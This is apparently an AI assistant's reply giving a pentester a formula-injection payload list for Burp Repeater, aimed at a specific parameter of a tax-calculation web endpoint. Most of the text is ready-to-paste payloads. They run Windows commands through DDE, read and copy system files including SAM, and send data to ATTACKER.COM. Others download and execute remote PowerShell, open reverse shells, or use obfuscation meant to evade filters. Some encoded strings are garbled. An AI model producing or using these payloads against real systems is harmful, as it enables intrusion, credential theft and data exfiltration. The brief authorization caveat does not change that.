# Formula Injection Payloads - Complete Testing List

**Parameter:** `AddEditPlanSubCode.PlanSubCodeKey`  
**Endpoint:** `/gettaxcalcbac/PlanSubCodes/SavePlanSubCode`  
**Method:** POST

---

## HOW TO USE THESE PAYLOADS

### In Burp Repeater:

```
Original Request Body:
...&AddEditPlanSubCode.PlanSubCodeKey=1%2B1%29%28OBJECTCLASS%3D*

To inject payload:
Replace: 1%2B1%29%28OBJECTCLASS%3D*
With: [PAYLOAD_FROM_BELOW]

Example:
...&AddEditPlanSubCode.PlanSubCodeKey=[INSERT_PAYLOAD_HERE]
```

---

## LEVEL 1: BASIC FORMULA TESTING (Low Risk)

### Payload 1.1: Simple Addition
```
Raw: =1+1
URL Encoded: =1%2B1
Risk: LOW
Expected Result: Shows "2" when calculated
```

### Payload 1.2: Multiple Operations
```
Raw: =1+1+1+1+1
URL Encoded: =1%2B1%2B1%2B1%2B1
Risk: LOW
Expected Result: Shows "5"
Tests: Backend accepts longer formulas than frontend
```

### Payload 1.3: Multiplication
```
Raw: =7*7
URL Encoded: =7*7
Risk: LOW
Expected Result: Shows "49"
```

### Payload 1.4: Division
```
Raw: =10/2
URL Encoded: =10/2
Risk: LOW
Expected Result: Shows "5"
```

### Payload 1.5: String Concatenation
```
Raw: ="Hello"&"World"
URL Encoded: ="Hello"%26"World"
Risk: LOW
Expected Result: Shows "HelloWorld"
```

---

## LEVEL 2: PROOF OF CONCEPT - CODE EXECUTION (Medium Risk)

### Payload 2.1: Calculator (Windows)
```
Raw: =cmd|'/c calc'!A1
URL Encoded: =cmd%7C%27%2Fc+calc%27%21A1
Risk: MEDIUM
Expected Result: Opens Calculator application
Impact: Proves code execution
Export Test: Open CSV in Excel, calculator should open
```

### Payload 2.2: Notepad (Windows)
```
Raw: =cmd|'/c notepad'!A1
URL Encoded: =cmd%7C%27%2Fc+notepad%27%21A1
Risk: MEDIUM
Expected Result: Opens Notepad
Impact: Alternative proof of code execution
```

### Payload 2.3: Command Prompt (Windows)
```
Raw: =cmd|'/c cmd'!A1
URL Encoded: =cmd%7C%27%2Fc+cmd%27%21A1
Risk: MEDIUM
Expected Result: Opens Command Prompt window
Impact: Shows command execution capability
```

### Payload 2.4: Windows Task Manager
```
Raw: =cmd|'/c taskmgr'!A1
URL Encoded: =cmd%7C%27%2Fc+taskmgr%27%21A1
Risk: MEDIUM
Expected Result: Opens Task Manager
Impact: Proves arbitrary program execution
```

---

## LEVEL 3: COMMAND OUTPUT CAPTURE (Medium-High Risk)

### Payload 3.1: Whoami (Show Current User)
```
Raw: =cmd|'/c whoami'!A1
URL Encoded: =cmd%7C%27%2Fc+whoami%27%21A1
Risk: MEDIUM-HIGH
Expected Result: Shows current Windows username
Impact: Identifies user running the application
```

### Payload 3.2: System Information
```
Raw: =cmd|'/c systeminfo'!A1
URL Encoded: =cmd%7C%27%2Fc+systeminfo%27%21A1
Risk: MEDIUM-HIGH
Expected Result: Shows Windows system information
Impact: OS version, patches, hardware info
```

### Payload 3.3: IP Configuration
```
Raw: =cmd|'/c ipconfig'!A1
URL Encoded: =cmd%7C%27%2Fc+ipconfig%27%21A1
Risk: MEDIUM-HIGH
Expected Result: Shows network configuration
Impact: Internal IP addresses exposed
```

### Payload 3.4: List Users
```
Raw: =cmd|'/c net user'!A1
URL Encoded: =cmd%7C%27%2Fc+net+user%27%21A1
Risk: MEDIUM-HIGH
Expected Result: Lists local user accounts
Impact: Identifies valid accounts on system
```

### Payload 3.5: List Network Shares
```
Raw: =cmd|'/c net share'!A1
URL Encoded: =cmd%7C%27%2Fc+net+share%27%21A1
Risk: MEDIUM-HIGH
Expected Result: Shows shared resources
Impact: Identifies accessible network shares
```

---

## LEVEL 4: FILE OPERATIONS (High Risk)

### Payload 4.1: Create File
```
Raw: =cmd|'/c powershell "New-Item -Path C:\Windows\Temp\pwned.txt -ItemType File"'!A1
URL Encoded: =cmd%7C%27%2Fc+powershell+"New-Item+-Path+C:\Windows\Temp\pwned.txt+-ItemType+File"%27%21A1
Risk: HIGH
Expected Result: Creates file in temp directory
Impact: Proves persistent file creation capability
```

### Payload 4.2: Write to File
```
Raw: =cmd|'/c powershell "Add-Content -Path C:\Windows\Temp\data.txt -Value 'Hacked'"'!A1
URL Encoded: =cmd%7C%27%2Fc+powershell+"Add-Content+-Path+C:\Windows\Temp\data.txt+-Value+%27Hacked%27"%27%21A1
Risk: HIGH
Expected Result: Creates and writes to file
Impact: Can write arbitrary data
```

### Payload 4.3: Read File
```
Raw: =cmd|'/c powershell "Get-Content C:\Windows\System32\drivers\etc\hosts"'!A1
URL Encoded: =cmd%7C%27%2Fc+powershell+"Get-Content+C:\Windows\System32\drivers\etc\hosts"%27%21A1
Risk: HIGH
Expected Result: Reads hosts file contents
Impact: Can read arbitrary files
```

### Payload 4.4: Copy File
```
Raw: =cmd|'/c copy C:\Windows\System32\config\SAM C:\Windows\Temp\SAM.bak'!A1
URL Encoded: =cmd%7C%27%2Fc+copy+C:\Windows\System32\config\SAM+C:\Windows\Temp\SAM.bak%27%21A1
Risk: HIGH
Expected Result: Copies SAM file
Impact: Can copy system files (requires admin)
```

### Payload 4.5: Directory Listing
```
Raw: =cmd|'/c dir C:\'!A1
URL Encoded: =cmd%7C%27%2Fc+dir+C:\%27%21A1
Risk: MEDIUM-HIGH
Expected Result: Lists C:\ directory contents
Impact: File system enumeration
```

---

## LEVEL 5: DATA EXFILTRATION (Critical Risk)

### Payload 5.1: Send Data via HTTP GET
```
Raw: =IMPORTXML("http://ATTACKER.COM/exfil?data=test","//a")
URL Encoded: =IMPORTXML("http://ATTACKER.COM/exfil?data=test","//a")
Risk: CRITICAL
Expected Result: HTTP request sent to attacker server
Impact: Data exfiltration capability
Note: Replace ATTACKER.COM with your server
```

### Payload 5.2: Send Data via PowerShell
```
Raw: =cmd|'/c powershell "Invoke-WebRequest -Uri http://ATTACKER.COM/exfil?user=$env:USERNAME"'!A1
URL Encoded: =cmd%7C%27%2Fc+powershell+"Invoke-WebRequest+-Uri+http://ATTACKER.COM/exfil?user=$env:USERNAME"%27%21A1
Risk: CRITICAL
Expected Result: Sends username to attacker server
Impact: Data exfiltration with environment variables
```

### Payload 5.3: Send File to Attacker
```
Raw: =cmd|'/c powershell "Invoke-WebRequest -Uri http://ATTACKER.COM/upload -InFile C:\Windows\Temp\pwned.txt"'!A1
URL Encoded: =cmd%7C%27%2Fc+powershell+"Invoke-WebRequest+-Uri+http://ATTACKER.COM/upload+-InFile+C:\Windows\Temp\pwned.txt"%27%21A1
Risk: CRITICAL
Expected Result: Sends file to attacker
Impact: Full file exfiltration capability
```

### Payload 5.4: Get from Attacker & Execute
```
Raw: =cmd|'/c powershell "IEX((New-Object Net.WebClient).DownloadString('http://ATTACKER.COM/cmd.ps1'))"'!A1
URL Encoded: =cmd%7C%27%2Fc+powershell+"IEX((New-Object+Net.WebClient).DownloadString(%27http://ATTACKER.COM/cmd.ps1%27))"%27%21A1
Risk: CRITICAL
Expected Result: Downloads and executes PowerShell script
Impact: Remote code execution from attacker server
```

---

## LEVEL 6: REVERSE SHELL (Critical Risk)

### Payload 6.1: PowerShell Reverse Shell
```
Raw: =cmd|'/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAoAAoAJABhAGQAZAByAGUAcwBzACAAPQAgACIAQQBUAFQAQQBDAEsAIABQAEMAIABJAFAAIgAKACQAcABvAHIAdAAgAD0AIAA0ADQANAQKACQAYwBsAGkAZQBuAHQALgBDAG8AbgBuAGUAYwB0ACgAJABhAGQAZAByAGUAcwBzACwAJABwAG8AcgB0ACkAOwoKACQAcwB0AGsAIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQAKACQAcwB3ACAAWwBpAG8ALgBTAHQAcmVAYQB0AGkAbgBnAFcAcgBpAHQAZQByAF0AGQBdAAoAJABzAHcALgBXAHIAaQB0AGUAKAIi'!A1
URL Encoded: [COMPLEX - see below]
Risk: CRITICAL
Expected Result: Connects back to attacker's machine
Impact: Full interactive shell access
Note: Base64 encoded PowerShell reverse shell
Requires: Attacker listening on port 4444
```

### Payload 6.2: Bash Reverse Shell (Linux)
```
Raw: =cmd|'/c bash -i >& /dev/tcp/ATTACKER.COM/4444 0>&1'!A1
URL Encoded: =cmd%7C%27%2Fc+bash+-i+>%26+/dev/tcp/ATTACKER.COM/4444+0>%261%27%21A1
Risk: CRITICAL
Expected Result: Connects to attacker with bash shell
Impact: Linux shell access if running on Linux
Note: Only works on Linux/Unix systems
```

---

## LEVEL 7: PRIVILEGE ESCALATION (Critical Risk)

### Payload 7.1: Run as Admin
```
Raw: =cmd|'/c powershell "Start-Process powershell -Verb RunAs -ArgumentList '-Command whoami'"'!A1
URL Encoded: =cmd%7C%27%2Fc+powershell+"Start-Process+powershell+-Verb+RunAs+-ArgumentList+%27-Command+whoami%27"%27%21A1
Risk: CRITICAL
Expected Result: Opens admin PowerShell
Impact: Privilege escalation attempt
```

### Payload 7.2: Run Service
```
Raw: =cmd|'/c powershell "Get-Service | Where-Object {$_.Status -eq 'Running'}"'!A1
URL Encoded: =cmd%7C%27%2Fc+powershell+"Get-Service+|+Where-Object+{$_.Status+-eq+%27Running%27}"%27%21A1
Risk: HIGH
Expected Result: Lists running services
Impact: Service enumeration
```

---

## LEVEL 8: OBFUSCATED PAYLOADS (Bypass Detection)

### Payload 8.1: Base64 Encoded Command
```
Raw: =cmd|'/c powershell -e JABjAG0AZAAgAD0AIgBjAG0AZA=="'!A1
URL Encoded: =cmd%7C%27%2Fc+powershell+-e+JABjAG0AZAAgAD0AIgBjAG0AZA=="%27%21A1
Risk: MEDIUM
Expected Result: Executes Base64 encoded command
Impact: Bypasses simple string matching
Note: "JABjAG0AZAAgAD0AIgBjAG0AZA==" = "$cmd ="cmd""
```

### Payload 8.2: Hex Encoded
```
Raw: =cmd|'/c powershell [Convert]::FromBase64String('cmM6XHdpbmRvd3Nc').GetString()'!A1
URL Encoded: =cmd%7C%27%2Fc+powershell+[Convert]::FromBase64String(%27cmM6XHdpbmRvd3Nc%27).GetString()%27%21A1
Risk: MEDIUM
Expected Result: Decodes hex and executes
Impact: Obfuscation bypass
```

### Payload 8.3: Variable Obfuscation
```
Raw: =cmd|'/c powershell "$c='cmd';& $c"'!A1
URL Encoded: =cmd%7C%27%2Fc+powershell+"$c=%27cmd%27;&+$c"%27%21A1
Risk: MEDIUM
Expected Result: Executes cmd via variable
Impact: Bypasses simple detection
```

---

## LEVEL 9: BYPASS & EVASION TECHNIQUES (High Risk)

### Payload 9.1: Comment Character Bypass
```
Raw: =cmd|'/c calc'!A1 '
URL Encoded: =cmd%7C%27%2Fc+calc%27%21A1+%27
Risk: MEDIUM
Expected Result: Executes while ignoring characters after comment
Impact: Bypasses input validation
```

### Payload 9.2: Whitespace Bypass
```
Raw: =cmd|'/c    calc'!A1
URL Encoded: =cmd%7C%27%2Fc++++calc%27%21A1
Risk: LOW
Expected Result: Extra spaces bypass string matching
Impact: Evades whitelist/blacklist filters
```

### Payload 9.3: Case Variation
```
Raw: =CMD|'/c CALC'!A1
URL Encoded: =CMD%7C%27%2Fc+CALC%27%21A1
Risk: LOW
Expected Result: Uppercase variant
Impact: Bypasses case-sensitive filters
```

### Payload 9.4: Alternative Command Format
```
Raw: =cmd|'/c "calc.exe"'!A1
URL Encoded: =cmd%7C%27%2Fc+"calc.exe"%27%21A1
Risk: MEDIUM
Expected Result: Quotes around executable
Impact: Bypasses parsing filters
```

---

## LEVEL 10: ALTERNATIVE FORMULA INJECTION (Template Injection)

### Payload 10.1: IMPORTXML Data Pull
```
Raw: =IMPORTXML("http://internal-server/data.xml","//record")
URL Encoded: =IMPORTXML("http://internal-server/data.xml","//record")
Risk: MEDIUM
Expected Result: Reads XML from internal server
Impact: SSRF + information disclosure
```

### Payload 10.2: QUERY Function
```
Raw: =QUERY(A:B,"select * where A contains 'data'")
URL Encoded: =QUERY(A:B,"select * where A contains %27data%27")
Risk: LOW
Expected Result: Queries data
Impact: Spreadsheet function testing
```

### Payload 10.3: INDIRECT Reference
```
Raw: =INDIRECT("C"&ROW())
URL Encoded: =INDIRECT("C"%26ROW())
Risk: LOW
Expected Result: Creates indirect reference
Impact: Dynamic formula testing
```

---

## TESTING CHECKLIST

```
✓ LEVEL 1 - Basic Formulas
  [ ] =1+1
  [ ] =1+1+1+1+1
  [ ] =7*7

✓ LEVEL 2 - Proof of Concept
  [ ] =cmd|'/c calc'!A1
  [ ] =cmd|'/c notepad'!A1
  [ ] =cmd|'/c cmd'!A1

✓ LEVEL 3 - Command Output
  [ ] =cmd|'/c whoami'!A1
  [ ] =cmd|'/c systeminfo'!A1
  [ ] =cmd|'/c ipconfig'!A1

✓ LEVEL 4 - File Operations
  [ ] =cmd|'/c powershell "New-Item..."'!A1
  [ ] =cmd|'/c dir C:\'!A1

✓ LEVEL 5 - Data Exfiltration
  [ ] =IMPORTXML("http://attacker.com/exfil?data=test","//a")

✓ LEVEL 6 - Reverse Shell
  [ ] PowerShell reverse shell (advanced)

✓ LEVEL 7 - Privilege Escalation
  [ ] Admin elevation attempts

✓ LEVEL 8 - Obfuscation
  [ ] Base64 encoded commands
  [ ] Hex encoding

✓ LEVEL 9 - Bypass Techniques
  [ ] Comments, whitespace, case variation

✓ LEVEL 10 - Template Injection
  [ ] Alternative formula types
```

---

## RECOMMENDED TESTING ORDER

### **Start Conservative (Low Risk):**
```
1. =1+1 (basic test)
2. =1+1+1+1+1 (test length bypass)
3. =7*7 (test calculation)
```

### **Then Proof of Concept (Medium Risk):**
```
4. =cmd|'/c calc'!A1 (calculator)
5. =cmd|'/c notepad'!A1 (notepad)
6. =cmd|'/c whoami'!A1 (whoami)
```

### **Finally Data Exfiltration (High Risk - Only if approved):**
```
7. =IMPORTXML("http://ATTACKER.COM/exfil?data=test","//a")
8. Reverse shell payloads
```

---

## CRITICAL NOTES

```
⚠️ BEFORE EXECUTING:
1. Get proper authorization
2. Test in isolated environment
3. Don't execute file deletion or destructive commands
4. Document everything

⚠️ URL ENCODING:
   Burp automatically encodes, but verify:
   Space = +
   | = %7C
   ' = %27
   / = %2F
   ! = %21
   " = %22
   & = %26

⚠️ REPLACE ATTACKER.COM:
   With your actual IP/domain if exfiltrating data
   Example: =IMPORTXML("http://192.168.1.100/exfil","//a")

⚠️ WINDOWS vs LINUX:
   Some payloads are Windows-only
   Bash reverse shell for Linux targets
```

---

## QUICK COPY-PASTE FOR BURP

**For each payload, replace this in your request:**

```
From:
&AddEditPlanSubCode.PlanSubCodeKey=1%2B1%29%28OBJECTCLASS%3D*

To:
&AddEditPlanSubCode.PlanSubCodeKey=[ENCODED_PAYLOAD]
```

**Example with calc payload:**
```
&AddEditPlanSubCode.PlanSubCodeKey==cmd%7C%27%2Fc+calc%27%21A1
```

---

**START WITH LEVEL 1 & 2, work your way up based on results!** 🚀

Let me know which payloads work and I'll help you document the findings!

